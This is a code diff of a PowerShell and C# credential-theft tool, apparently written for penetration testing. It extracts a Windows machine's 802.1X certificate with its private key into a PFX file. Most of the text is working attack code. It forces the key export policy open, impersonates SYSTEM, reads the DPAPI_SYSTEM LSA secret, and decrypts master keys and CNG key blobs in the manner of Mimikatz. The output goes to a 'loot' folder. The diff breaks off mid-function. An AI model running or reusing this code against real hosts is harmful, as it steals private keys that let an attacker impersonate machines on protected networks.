@@ -1,24 +1,19 @@
 #Requires -RunAsAdministrator
 <#
 .SYNOPSIS
-    Extract 802.1X machine certificate with private key from Windows host.
-    Pentest PASSI context - no third-party tools, .NET native + Windows APIs only.
-
+    Extract 802.1X machine certificate with private key (PFX) from Windows host.
+    Full DPAPI chain: LSA secret -> master key -> CNG blob -> RSA -> PFX.
+    No third-party tools, .NET native + Windows APIs only.
 .PARAMETER OutputDir
-    Directory where the .pfx will be saved. Default: current directory.
-
+    Directory for the .pfx output. Default: current directory.
 .PARAMETER PfxPassword
-    Password for the exported .pfx file. Default: "exfiltrated".
-
+    PFX password. Default: "exfiltrated".
 .PARAMETER Thumbprint
-    Optional: target a specific certificate by thumbprint.
-
+    Optional: target a specific cert by thumbprint.
 .EXAMPLE
-    .\Extract-8021xCert.ps1
-    .\Extract-8021xCert.ps1 -OutputDir C:\temp -PfxPassword "P@ss123"
-    .\Extract-8021xCert.ps1 -Thumbprint "A1B2C3..."
+    .\Extract-8021xCert-v2.ps1
+    .\Extract-8021xCert-v2.ps1 -OutputDir C:\loot -PfxPassword "P@ss"
 #>
-
 [CmdletBinding()]
 param(
     [string]$OutputDir = ".",
@@ -29,1033 +24,878 @@ param(
 Set-StrictMode -Version Latest
 $ErrorActionPreference = "Stop"
 
-# --- P/Invoke definitions for CNG key export policy patching ---
-Add-Type -TypeDefinition @"
+$CSharpCode = @"
 using System;
+using System.IO;
+using System.Numerics;
 using System.Runtime.InteropServices;
-
-public static class NCryptInterop
-{
-    // NCrypt handle types
-    public const uint NCRYPT_ALLOW_EXPORT_FLAG = 0x00000001;
-    public const uint NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG = 0x00000002;
-    public const uint NCRYPT_ALLOW_ARCHIVING_FLAG = 0x00000004;
-    public const uint NCRYPT_ALLOW_PLAINTEXT_ARCHIVING_FLAG = 0x00000008;
-
-    public const int NCRYPT_EXPORT_POLICY_PROPERTY_ID = 0;
-    public const string NCRYPT_EXPORT_POLICY_PROPERTY = "Export Policy";
-
-    public const uint NCRYPT_SILENT_FLAG = 0x00000040;
-    public const uint NCRYPT_OVERWRITE_KEY_FLAG = 0x00000080;
-
-    // Error codes
-    public const int NTE_BAD_FLAGS = unchecked((int)0x80090009);
-
-    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
-    public static extern int NCryptOpenStorageProvider(
-        out IntPtr phProvider,
-        string pszProviderName,
-        uint dwFlags);
-
-    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
-    public static extern int NCryptOpenKey(
-        IntPtr hProvider,
-        out IntPtr phKey,
-        string pszKeyName,
-        uint dwLegacyKeySpec,
-        uint dwFlags);
-
-    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
-    public static extern int NCryptSetProperty(
-        IntPtr hObject,
-        string pszProperty,
-        byte[] pbInput,
-        int cbInput,
-        uint dwFlags);
-
-    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
-    public static extern int NCryptGetProperty(
-        IntPtr hObject,
-        string pszProperty,
-        byte[] pbOutput,
-        int cbOutput,
-        out int pcbResult,
-        uint dwFlags);
-
-    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
-    public static extern int NCryptExportKey(
-        IntPtr hKey,
-        IntPtr hExportKey,
-        string pszBlobType,
-        IntPtr pParameterList,
-        byte[] pbOutput,
-        int cbOutput,
-        out int pcbResult,
-        uint dwFlags);
-
-    [DllImport("ncrypt.dll")]
-    public static extern int NCryptFreeObject(IntPtr hObject);
-
-    // For DPAPI-based approach (reading raw key files)
-    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
-    public static extern int NCryptDeleteKey(IntPtr hKey, uint dwFlags);
-
-    // BCrypt for importing raw key material
-    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
-    public static extern int BCryptOpenAlgorithmProvider(
-        out IntPtr phAlgorithm,
-        string pszAlgId,
-        string pszImplementation,
-        uint dwFlags);
-
-    [DllImport("bcrypt.dll")]
-    public static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);
-
-    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
-    public static extern int BCryptImportKeyPair(
-        IntPtr hAlgorithm,
-        IntPtr hImportKey,
-        string pszBlobType,
-        out IntPtr phKey,
-        byte[] pbInput,
-        int cbInput,
-        uint dwFlags);
-
-    [DllImport("bcrypt.dll")]
-    public static extern int BCryptDestroyKey(IntPtr hKey);
-
-    public static uint GetExportPolicy(IntPtr hKey)
-    {
-        byte[] buf = new byte[4];
-        int cbResult;
-        int status = NCryptGetProperty(hKey, NCRYPT_EXPORT_POLICY_PROPERTY, buf, 4, out cbResult, 0);
-        if (status != 0)
-            throw new Exception("NCryptGetProperty failed: 0x" + status.ToString("X8"));
-        return BitConverter.ToUInt32(buf, 0);
-    }
-
-    public static int PatchExportPolicy(IntPtr hKey)
-    {
-        uint newPolicy = NCRYPT_ALLOW_EXPORT_FLAG | NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG;
-        byte[] policyBytes = BitConverter.GetBytes(newPolicy);
-        return NCryptSetProperty(hKey, NCRYPT_EXPORT_POLICY_PROPERTY, policyBytes, 4, NCRYPT_SILENT_FLAG);
-    }
-}
-"@ -ErrorAction SilentlyContinue
-
-Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
-
-# --- Helper: build PFX from RSA key blob + certificate ---
-# Handles both BCRYPT_RSAFULLPRIVATE_BLOB (RSA3, from NCryptExportKey)
-# and CAPI key file blob (RSA2 with padding, from DPAPI decrypt)
-Add-Type -TypeDefinition @"
-using System;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
+using System.Text;
 
-public static class PfxBuilder
+public static class CngExtractor
 {
-    // Build PFX from BCRYPT_RSAFULLPRIVATE_BLOB (RSA3 magic, from NCryptExportKey)
-    public static byte[] BuildPfxFromBcryptBlob(byte[] blob, byte[] certDer, string password)
+    [StructLayout(LayoutKind.Sequential)]
+    struct LSA_UNICODE_STRING { public ushort Length; public ushort MaximumLength; public IntPtr Buffer; }
+    [StructLayout(LayoutKind.Sequential)]
+    struct LSA_OBJECT_ATTRIBUTES { public int Length; public IntPtr RootDirectory; public IntPtr ObjectName; public int Attributes; public IntPtr SecurityDescriptor; public IntPtr SecurityQualityOfService; }
+
+    [DllImport("advapi32.dll")] static extern int LsaOpenPolicy(IntPtr SystemName, ref LSA_OBJECT_ATTRIBUTES Attr, int Access, out IntPtr Handle);
+    [DllImport("advapi32.dll")] static extern int LsaRetrievePrivateData(IntPtr Handle, ref LSA_UNICODE_STRING Name, out IntPtr Data);
+    [DllImport("advapi32.dll")] static extern int LsaClose(IntPtr Handle);
+    [DllImport("advapi32.dll")] static extern int LsaFreeMemory(IntPtr Buf);
+    [DllImport("advapi32.dll", SetLastError=true)] static extern bool OpenProcessToken(IntPtr hProc, uint access, out IntPtr hTok);
+    [DllImport("advapi32.dll", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr hTok, uint access, IntPtr attr, int impLevel, int tokType, out IntPtr hNew);
+    [DllImport("advapi32.dll", SetLastError=true)] static extern bool ImpersonateLoggedOnUser(IntPtr hTok);
+    [DllImport("advapi32.dll")] static extern bool RevertToSelf();
+    [DllImport("advapi32.dll", CharSet=CharSet.Unicode, SetLastError=true)] static extern bool LookupPrivilegeValue(string sys, string name, out long luid);
+    [DllImport("advapi32.dll", SetLastError=true)] static extern bool AdjustTokenPrivileges(IntPtr hTok, bool disableAll, byte[] newState, int bufLen, IntPtr prev, IntPtr retLen);
+    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
+    [DllImport("kernel32.dll", SetLastError=true)] static extern bool CloseHandle(IntPtr h);
+    [DllImport("ncrypt.dll", CharSet=CharSet.Unicode)] static extern int NCryptOpenStorageProvider(out IntPtr hProv, string name, int flags);
+    [DllImport("ncrypt.dll", CharSet=CharSet.Unicode)] static extern int NCryptOpenKey(IntPtr hProv, out IntPtr hKey, string name, int spec, int flags);
+    [DllImport("ncrypt.dll", CharSet=CharSet.Unicode)] static extern int NCryptGetProperty(IntPtr h, string prop, byte[] buf, int cbBuf, out int cbResult, int flags);
+    [DllImport("ncrypt.dll", CharSet=CharSet.Unicode)] static extern int NCryptExportKey(IntPtr hKey, IntPtr hExp, string type, IntPtr param, byte[] buf, int cbBuf, out int cbResult, int flags);
+    [DllImport("ncrypt.dll", CharSet=CharSet.Unicode)] static extern int NCryptSetProperty(IntPtr h, string prop, byte[] val, int cb, int flags);
+    [DllImport("ncrypt.dll")] static extern int NCryptFreeObject(IntPtr h);
+    [DllImport("crypt32.dll", SetLastError=true)] static extern bool CertGetCertificateContextProperty(IntPtr ctx, uint propId, IntPtr data, ref int cbData);
+
+    // CNG DPAPI entropy (Mimikatz kull_m_key.h / SharpDPAPI Dpapi.cs:302)
+    static readonly byte[] CNG_KEY_ENTROPY = Encoding.UTF8.GetBytes("xT5rZW5qVVbrvpuA\0");
+
+    public static byte[] ExtractPfx(X509Certificate2 cert, string password, out string log)
     {
-        if (blob.Length < 24)
-            throw new Exception("Blob too short for BCRYPT_RSAKEY_BLOB header");
-
-        uint magic = BitConverter.ToUInt32(blob, 0);
-        if (magic != 0x33415352)
-            throw new Exception("Not RSA3 blob (magic=0x" + magic.ToString("X8") + ")");
-
-        int cbPublicExp = (int)BitConverter.ToUInt32(blob, 8);
-        int cbModulus   = (int)BitConverter.ToUInt32(blob, 12);
-        int cbPrime1    = (int)BitConverter.ToUInt32(blob, 16);
-        int cbPrime2    = (int)BitConverter.ToUInt32(blob, 20);
-
-        int offset = 24;
-        byte[] publicExponent  = Extract(blob, ref offset, cbPublicExp);
-        byte[] modulus         = Extract(blob, ref offset, cbModulus);
-        byte[] prime1          = Extract(blob, ref offset, cbPrime1);
-        byte[] prime2          = Extract(blob, ref offset, cbPrime2);
-        byte[] exponent1       = Extract(blob, ref offset, cbPrime1);
-        byte[] exponent2       = Extract(blob, ref offset, cbPrime2);
-        byte[] coefficient     = Extract(blob, ref offset, cbPrime1);
-        byte[] privateExponent = Extract(blob, ref offset, cbModulus);
-
-        RSAParameters p = new RSAParameters();
-        p.Exponent = publicExponent; p.Modulus = modulus;
-        p.P = prime1; p.Q = prime2;
-        p.DP = exponent1; p.DQ = exponent2;
-        p.InverseQ = coefficient; p.D = privateExponent;
-
-        return BuildPfxFromParams(p, certDer, password);
-    }
-
-    // Build PFX from a CAPI CSP blob (BLOBHEADER + RSAPUBKEY + key data, little-endian)
-    public static byte[] BuildPfxFromCspBlob(byte[] cspBlob, byte[] certDer, string password)
-    {
-        CspParameters csp = new CspParameters();
-        csp.KeyContainerName = Guid.NewGuid().ToString();
-        csp.KeyNumber = 1; // AT_KEYEXCHANGE
-
-        RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(csp);
-        rsa.PersistKeyInCsp = true;
-        rsa.ImportCspBlob(cspBlob);
-
-        X509Certificate2 cert = new X509Certificate2(certDer);
-        cert.PrivateKey = rsa;
-        byte[] pfxBytes = cert.Export(X509ContentType.Pfx, password);
-
-        rsa.PersistKeyInCsp = false;
-        rsa.Clear();
-        return pfxBytes;
-    }
-
-    private static byte[] BuildPfxFromParams(RSAParameters rsaParams, byte[] certDer, string password)
-    {
-        CspParameters csp = new CspParameters();
-        csp.KeyContainerName = Guid.NewGuid().ToString();
-        csp.KeyNumber = 1;
-
-        RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(csp);
-        rsa.PersistKeyInCsp = true;
-        rsa.ImportParameters(rsaParams);
-
-        X509Certificate2 cert = new X509Certificate2(certDer);
-        cert.PrivateKey = rsa;
-        byte[] pfxBytes = cert.Export(X509ContentType.Pfx, password);
-
-        rsa.PersistKeyInCsp = false;
-        rsa.Clear();
-        return pfxBytes;
-    }
-
-    private static byte[] Extract(byte[] source, ref int offset, int length)
-    {
-        byte[] result = new byte[length];
-        Array.Copy(source, offset, result, 0, length);
-        offset += length;
-        return result;
-    }
-}
-"@ -ErrorAction SilentlyContinue
-
-# --- Helper: resolve private key container info from cert ---
-# Tries .NET APIs first, falls back to certutil (language-independent regex)
-function Get-PrivateKeyInfo {
-    param(
-        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Cert,
-        [string]$StoreLocation = "LocalMachine"
-    )
-
-    $info = @{ KeyName = $null; UniqueName = $null; Provider = $null }
-
-    # Try 1: GetRSAPrivateKey extension method
-    try {
-        $rsa = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPrivateKey($Cert)
-        if ($rsa) {
-            $tn = $rsa.GetType().Name
-            if ($tn -eq "RSACng") {
-                try { $info.KeyName = $rsa.Key.KeyName; $info.UniqueName = $rsa.Key.UniqueName; $info.Provider = $rsa.Key.Provider.Provider } catch {}
+        var sb = new StringBuilder();
+        try
+        {
+            sb.AppendLine("[*] Method 1: Direct .NET PFX export...");
+            try
+            {
+                byte[] pfx1 = cert.Export(X509ContentType.Pfx, password);
+                if (pfx1 != null && pfx1.Length > 0 && VerifyPfx(pfx1, password))
+                { sb.AppendLine("[+] Method 1 SUCCESS"); log = sb.ToString(); return pfx1; }
             }
-            elseif ($tn -eq "RSACryptoServiceProvider") {
-                try { $ci = $rsa.CspKeyContainerInfo; $info.KeyName = $ci.KeyContainerName; $info.UniqueName = $ci.UniqueKeyContainerName; $info.Provider = $ci.ProviderName } catch {}
+            catch (Exception ex) { sb.AppendLine("[-] " + ex.Message); }
+
+            sb.AppendLine("[*] Method 2: NCrypt export policy patch...");
+            byte[] pfx2 = TryNcryptPatch(cert, password, sb);
+            if (pfx2 != null) { log = sb.ToString(); return pfx2; }
+
+            sb.AppendLine("[*] Method 3: Full DPAPI chain (LSA->MK->DPAPI->RSA->PFX)...");
+            byte[] pfx3 = DpapiChainExtract(cert, password, sb);
+            if (pfx3 != null) { log = sb.ToString(); return pfx3; }
+
+            sb.AppendLine("[-] All methods failed.");
+            log = sb.ToString(); return null;
+        }
+        catch (Exception ex) { sb.AppendLine("[!] Fatal: " + ex); log = sb.ToString(); return null; }
+    }
+
+    static byte[] TryNcryptPatch(X509Certificate2 cert, string password, StringBuilder sb)
+    {
+        string keyName = GetKeyContainerName(cert);
+        if (keyName == null) { sb.AppendLine("[-] No key container name"); return null; }
+        bool wasSys = false;
+        try
+        {
+            wasSys = ImpersonateSystem();
+            IntPtr hProv, hKey;
+            int hr = NCryptOpenStorageProvider(out hProv, "Microsoft Software Key Storage Provider", 0);
+            if (hr != 0) { sb.AppendLine("[-] OpenProvider: 0x" + hr.ToString("X8")); return null; }
+            hr = NCryptOpenKey(hProv, out hKey, keyName, 0, 0x20);
+            if (hr != 0) hr = NCryptOpenKey(hProv, out hKey, keyName, 0, 0);
+            if (hr != 0) { NCryptFreeObject(hProv); sb.AppendLine("[-] OpenKey: 0x" + hr.ToString("X8")); return null; }
+
+            byte[] pol = BitConverter.GetBytes(3);
+            hr = NCryptSetProperty(hKey, "Export Policy", pol, 4, 0x40);
+            if (hr != 0) hr = NCryptSetProperty(hKey, "Export Policy", pol, 4, unchecked((int)0x80000000));
+            if (hr != 0) { sb.AppendLine("[-] SetProperty: 0x" + hr.ToString("X8")); NCryptFreeObject(hKey); NCryptFreeObject(hProv); return null; }
+
+            int cbOut;
+            hr = NCryptExportKey(hKey, IntPtr.Zero, "RSAFULLPRIVATEBLOB", IntPtr.Zero, null, 0, out cbOut, 0);
+            if (hr == 0 && cbOut > 0)
+            {
+                byte[] blob = new byte[cbOut];
+                hr = NCryptExportKey(hKey, IntPtr.Zero, "RSAFULLPRIVATEBLOB", IntPtr.Zero, blob, cbOut, out cbOut, 0);
+                if (hr == 0)
+                {
+                    sb.AppendLine("[+] NCrypt export OK (" + cbOut + "B)");
+                    byte[] pfx = BuildPfxFromFullBlob(blob, cert.RawData, password);
+                    NCryptFreeObject(hKey); NCryptFreeObject(hProv);
+                    if (pfx != null && VerifyPfx(pfx, password)) { sb.AppendLine("[+] Method 2 SUCCESS"); return pfx; }
+                }
             }
+            sb.AppendLine("[-] Export: 0x" + hr.ToString("X8"));
+            NCryptFreeObject(hKey); NCryptFreeObject(hProv);
+            return null;
         }
-    } catch {}
-
-    if ($info.KeyName) { return $info }
-
-    # Try 2: .PrivateKey property (CAPI)
-    try {
-        $pk = $Cert.PrivateKey
-        if ($pk -is [System.Security.Cryptography.RSACryptoServiceProvider]) {
-            $ci = $pk.CspKeyContainerInfo
-            $info.KeyName = $ci.KeyContainerName
-            $info.UniqueName = $ci.UniqueKeyContainerName
-            $info.Provider = $ci.ProviderName
-        }
-    } catch {}
-
-    if ($info.KeyName) { return $info }
-
-    # Try 3: certutil (works regardless of ACLs, language-independent patterns)
-    try {
-        $certutilOut = & certutil -v -store My $Cert.Thumbprint 2>&1 | Out-String
-
-        # Key container name (EN: "Key Container", FR: "Conteneur de cl...")
-        if ($certutilOut -match '(?:Key Container|Conteneur de cl[^\r\n]*?)[=:]\s*(.+)') {
-            $info.KeyName = $Matches[1].Trim()
-        }
-        # Unique container name (EN: "Unique container name", FR: "Nom unique du conteneur")
-        if ($certutilOut -match '(?:Unique container name|Nom unique du conteneur)[^=:\r\n]*[=:]\s*(.+)') {
-            $info.UniqueName = $Matches[1].Trim()
-        }
-        # Provider (EN: "Provider", FR: "Fournisseur")
-        if ($certutilOut -match '(?:Provider = |Fournisseur = )(.+)') {
-            $info.Provider = $Matches[1].Trim()
-        }
-    } catch {}
-
-    return $info
-}
-
-function Write-Banner {
-    Write-Host ""
-    Write-Host "=============================================" -ForegroundColor Cyan
-    Write-Host "  Extract-8021xCert - 802.1X Cert Exfil Tool" -ForegroundColor Cyan
-    Write-Host "  .NET Native / No third-party tools" -ForegroundColor DarkCyan
-    Write-Host "=============================================" -ForegroundColor Cyan
-    Write-Host ""
-}
-
-function Test-IsElevated {
-    $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
-    $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
-    $isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
-
-    $isSystem = $identity.User.Value -eq "S-1-5-18"
-
-    return @{
-        IsAdmin  = $isAdmin
-        IsSystem = $isSystem
-        UserName = $identity.Name
-    }
-}
-
-function Get-CertificateTemplate {
-    param([System.Security.Cryptography.X509Certificates.X509Certificate2]$Cert)
-
-    # OID 1.3.6.1.4.1.311.21.7 = Certificate Template Information (V2)
-    # OID 1.3.6.1.4.1.311.20.2 = Certificate Template Name (V1)
-    $templateName = ""
-
-    $extV1 = $Cert.Extensions | Where-Object { $_.Oid.Value -eq "1.3.6.1.4.1.311.20.2" }
-    if ($extV1) {
-        $templateName = $extV1.Format($false)
+        finally { if (wasSys) RevertToSelf(); }
     }
 
-    $extV2 = $Cert.Extensions | Where-Object { $_.Oid.Value -eq "1.3.6.1.4.1.311.21.7" }
-    if ($extV2) {
-        $formatted = $extV2.Format($true)
-        if ($formatted -match "Template=(.+?)[\r\n]") {
-            $templateName = $Matches[1].Trim()
-        }
-        elseif ($formatted -match "(.+)") {
-            if (-not $templateName) {
-                $templateName = $formatted.Trim()
+    static byte[] DpapiChainExtract(X509Certificate2 cert, string password, StringBuilder sb)
+    {
+        string keyName = GetKeyContainerName(cert);
+        string uniqueName = GetKeyUniqueName(keyName);
+        if (uniqueName == null) { sb.AppendLine("[-] No unique key name"); return null; }
+        sb.AppendLine("[+] Unique name: " + uniqueName);
+
+        string keyFilePath = FindKeyFile(uniqueName);
+        if (keyFilePath == null) { sb.AppendLine("[-] Key file not found"); return null; }
+        sb.AppendLine("[+] Key file: " + keyFilePath);
+
+        bool wasSys = false;
+        try
+        {
+            wasSys = ImpersonateSystem();
+            if (!wasSys) { sb.AppendLine("[-] SYSTEM impersonation failed"); return null; }
+            sb.AppendLine("[+] SYSTEM context");
+
+            byte[] kf = File.ReadAllBytes(keyFilePath);
+
+            // Parse CNG key file: header(32) + zeros(12) + name + pubProps + privProps + privKey
+            int nameLen = (int)BitConverter.ToUInt32(kf, 8);
+            int pubPropsLen = (int)BitConverter.ToUInt32(kf, 16);
+            int privPropsLen = (int)BitConverter.ToUInt32(kf, 20);
+            int privKeyLen = (int)BitConverter.ToUInt32(kf, 24);
+            int privKeyOff = 44 + nameLen + pubPropsLen + privPropsLen;
+            byte[] privKeyBlob = new byte[privKeyLen];
+            Array.Copy(kf, privKeyOff, privKeyBlob, 0, privKeyLen);
+            sb.AppendLine("[*] PrivKey DPAPI blob: " + privKeyLen + "B @" + privKeyOff);
+
+            // Parse DPAPI blob -> master key GUID
+            string mkGuid = ExtractMkGuid(privKeyBlob);
+            if (mkGuid == null) { sb.AppendLine("[-] No MK GUID in blob"); return null; }
+            sb.AppendLine("[*] MK GUID: " + mkGuid);
+
+            // Extract DPAPI_SYSTEM LSA secret
+            byte[] sys = GetDpapiSystem();
+            if (sys == null || sys.Length < 44) { sb.AppendLine("[-] DPAPI_SYSTEM extraction failed"); return null; }
+            byte[] userKey = new byte[20]; Array.Copy(sys, 4, userKey, 0, 20);
+            byte[] machineKey = new byte[20]; Array.Copy(sys, 24, machineKey, 0, 20);
+            sb.AppendLine("[+] DPAPI_SYSTEM OK (" + sys.Length + "B)");
+
+            // Find master key file
+            string mkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System),
+                "Microsoft", "Protect", "S-1-5-18", mkGuid);
+            if (!File.Exists(mkPath))
+            {
+                string dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System),
+                    "Microsoft", "Protect", "S-1-5-18");
+                if (Directory.Exists(dir))
+                    foreach (string f in Directory.GetFiles(dir))
+                        if (Path.GetFileName(f).Equals(mkGuid, StringComparison.OrdinalIgnoreCase))
+                        { mkPath = f; break; }
             }
+            if (!File.Exists(mkPath)) { sb.AppendLine("[-] MK file not found: " + mkPath); return null; }
+            byte[] mkFile = File.ReadAllBytes(mkPath);
+            sb.AppendLine("[+] MK file: " + mkFile.Length + "B");
+
+            // Decrypt master key (try userKey then machineKey)
+            byte[] masterKey = DecryptMasterKey(mkFile, userKey, sb);
+            if (masterKey == null)
+            {
+                sb.AppendLine("[*] userKey failed, trying machineKey...");
+                masterKey = DecryptMasterKey(mkFile, machineKey, sb);
+            }
+            if (masterKey == null) { sb.AppendLine("[-] MK decryption failed"); return null; }
+            sb.AppendLine("[+] Master key: " + masterKey.Length + "B");
+
+            // Decrypt CNG DPAPI blob with entropy
+            byte[] rsaBlob = DecryptDpapi(privKeyBlob, masterKey, CNG_KEY_ENTROPY, sb);
+            if (rsaBlob == null) { sb.AppendLine("[-] DPAPI decrypt failed"); return null; }
+            sb.AppendLine("[+] Decrypted: " + rsaBlob.Length + "B");
+
+            if (rsaBlob.Length < 24 || rsaBlob[0] != 0x52 || rsaBlob[1] != 0x53 || rsaBlob[2] != 0x41)
+            { sb.AppendLine("[-] No RSA magic"); return null; }
+            sb.AppendLine("[+] RSA magic: " + Encoding.ASCII.GetString(rsaBlob, 0, 4));
+
+            byte[] pfx = BuildPfxFromRsa2(rsaBlob, cert.RawData, password, sb);
+            if (pfx != null && VerifyPfx(pfx, password))
+            { sb.AppendLine("[+] Method 3 SUCCESS!"); return pfx; }
+            sb.AppendLine("[-] PFX build failed");
+            return null;
+        }
+        catch (Exception ex) { sb.AppendLine("[-] Error: " + ex.Message); return null; }
+        finally { if (wasSys) RevertToSelf(); }
+    }
+
+    // --- DPAPI_SYSTEM LSA SECRET ---
+    static byte[] GetDpapiSystem()
+    {
+        var attr = new LSA_OBJECT_ATTRIBUTES { Length = Marshal.SizeOf(typeof(LSA_OBJECT_ATTRIBUTES)) };
+        IntPtr hPol;
+        if (LsaOpenPolicy(IntPtr.Zero, ref attr, 4, out hPol) != 0) return null;
+        try
+        {
+            string nm = "DPAPI_SYSTEM";
+            IntPtr pNm = Marshal.StringToHGlobalUni(nm);
+            var ls = new LSA_UNICODE_STRING { Length = (ushort)(nm.Length*2), MaximumLength = (ushort)((nm.Length+1)*2), Buffer = pNm };
+            IntPtr pData;
+            int hr = LsaRetrievePrivateData(hPol, ref ls, out pData);
+            Marshal.FreeHGlobal(pNm);
+            if (hr != 0 || pData == IntPtr.Zero) return null;
+            try
+            {
+                ushort len = (ushort)Marshal.ReadInt16(pData, 0);
+                IntPtr buf = Marshal.ReadIntPtr(pData, IntPtr.Size == 8 ? 8 : 4);
+                if (len < 44 || buf == IntPtr.Zero) return null;
+                byte[] r = new byte[len]; Marshal.Copy(buf, r, 0, len); return r;
+            }
+            finally { LsaFreeMemory(pData); }
+        }
+        finally { LsaClose(hPol); }
+    }
+
+    // --- MASTER KEY DECRYPTION ---
+    static byte[] DecryptMasterKey(byte[] file, byte[] dpapiKey, StringBuilder sb)
+    {
+        if (file.Length < 160) return null;
+        long mkLen = (long)BitConverter.ToUInt64(file, 96);
+        if (mkLen <= 32 || mkLen > file.Length - 128) return null;
+
+        int o = 128;
+        byte[] salt = new byte[16]; Array.Copy(file, o+4, salt, 0, 16);
+        uint iters = BitConverter.ToUInt32(file, o+20);
+        uint hAlg = BitConverter.ToUInt32(file, o+24);
+        uint cAlg = BitConverter.ToUInt32(file, o+28);
+        int edLen = (int)mkLen - 32;
+        byte[] ed = new byte[edLen]; Array.Copy(file, o+32, ed, 0, edLen);
+
+        sb.AppendLine("[*] MK decrypt: rounds=" + iters + " hash=0x" + hAlg.ToString("X") + " crypt=0x" + cAlg.ToString("X"));
+
+        int kLen, ivLen;
+        if (cAlg == 0x6610) { kLen = 32; ivLen = 16; }
+        else if (cAlg == 0x6603) { kLen = 24; ivLen = 8; }
+        else return null;
+        string hn = (hAlg == 0x800E) ? "SHA512" : "SHA1";
+
+        byte[] dk = MsPbkdf2(dpapiKey, salt, (int)iters, kLen + ivLen, hn);
+        byte[] ck = new byte[kLen]; Array.Copy(dk, 0, ck, 0, kLen);
+        byte[] iv = new byte[ivLen]; Array.Copy(dk, kLen, iv, 0, ivLen);
+
+        byte[] ct = (cAlg == 0x6610) ? AesDec(ck, iv, ed) : DesDec(ck, iv, ed);
+        if (ct == null || ct.Length < 80) return null;
+
+        byte[] mk = new byte[64]; Array.Copy(ct, ct.Length - 64, mk, 0, 64);
+
+        // HMAC verify
+        byte[] hs = new byte[16]; Array.Copy(ct, 0, hs, 0, 16);
+        int tl = (hAlg == 0x800E) ? 16 : 20;
+        byte[] stored = new byte[tl]; Array.Copy(ct, 16, stored, 0, tl);
+        byte[] hk; using (var h = Hmac(hn, dpapiKey)) hk = h.ComputeHash(hs);
+        byte[] calc; using (var h = Hmac(hn, hk)) calc = h.ComputeHash(mk);
+        byte[] ct2 = new byte[tl]; Array.Copy(calc, ct2, tl);
+        if (!Eq(ct2, stored)) { sb.AppendLine("[-] MK HMAC mismatch"); return null; }
+        sb.AppendLine("[+] MK HMAC OK!");
+        return mk;
+    }
+
+    // --- MS NON-STANDARD PBKDF2 ---
+    static byte[] MsPbkdf2(byte[] pw, byte[] salt, int iters, int need, string hn)
+    {
+        using (var hm = Hmac(hn, pw))
+        {
+            int bs = hm.HashSize / 8;
+            int nb = (need + bs - 1) / bs;
+            byte[] res = new byte[nb * bs];
+            for (int b = 1; b <= nb; b++)
+            {
+                byte[] sb2 = new byte[salt.Length + 4];
+                Array.Copy(salt, sb2, salt.Length);
+                sb2[salt.Length]=(byte)((b>>24)&0xFF); sb2[salt.Length+1]=(byte)((b>>16)&0xFF);
+                sb2[salt.Length+2]=(byte)((b>>8)&0xFF); sb2[salt.Length+3]=(byte)(b&0xFF);
+                byte[] u = hm.ComputeHash(sb2);
+                byte[] acc = (byte[])u.Clone();
+                for (int i = 2; i <= iters; i++)
+                {
+                    u = hm.ComputeHash(u);
+                    for (int j = 0; j < bs; j++) acc[j] ^= u[j];
+                    Array.Copy(acc, u, bs); // MS non-standard: XOR accumulator feedback
+                }
+                Array.Copy(acc, 0, res, (b-1)*bs, bs);
+            }
+            byte[] o = new byte[need]; Array.Copy(res, o, need); return o;
         }
     }
 
-    return $templateName
+    // --- DPAPI BLOB DECRYPTION ---
+    static string ExtractMkGuid(byte[] b)
+    {
+        if (b.Length < 44) return null;
+        int o = 24;
+        return string.Format("{0:x8}-{1:x4}-{2:x4}-{3}-{4}",
+            BitConverter.ToUInt32(b, o), BitConverter.ToUInt16(b, o+4), BitConverter.ToUInt16(b, o+6),
+            BitConverter.ToString(b, o+8, 2).Replace("-","").ToLower(),
+            BitConverter.ToString(b, o+10, 6).Replace("-","").ToLower());
+    }
+
+    static byte[] DecryptDpapi(byte[] b, byte[] mk, byte[] entropy, StringBuilder sb)
+    {
+        int o = 44; // skip version(4)+provider(16)+mkVer(4)+mkGuid(16)+flags(4)
+        int dl = (int)BitConverter.ToUInt32(b, o); o += 4 + dl;
+        uint ac = BitConverter.ToUInt32(b, o); o += 8;
+        int sl = (int)BitConverter.ToUInt32(b, o); o += 4;
+        byte[] salt = new byte[sl]; Array.Copy(b, o, salt, 0, sl); o += sl;
+        int hkl = (int)BitConverter.ToUInt32(b, o); o += 4 + hkl;
+        uint ah = BitConverter.ToUInt32(b, o); o += 8;
+        int h2l = (int)BitConverter.ToUInt32(b, o); o += 4 + h2l;
+        int edl = (int)BitConverter.ToUInt32(b, o); o += 4;
+        byte[] ed = new byte[edl]; Array.Copy(b, o, ed, 0, edl);
+
+        sb.AppendLine("[*] DPAPI: crypt=0x"+ac.ToString("X")+" hash=0x"+ah.ToString("X")+" data="+edl+"B");
+
+        byte[] kh; using (var s = SHA1.Create()) kh = s.ComputeHash(mk);
+        string hn = (ah == 0x800E) ? "SHA512" : "SHA1";
+        byte[] hi = new byte[salt.Length + entropy.Length];
+        Array.Copy(salt, hi, salt.Length);
+        Array.Copy(entropy, 0, hi, salt.Length, entropy.Length);
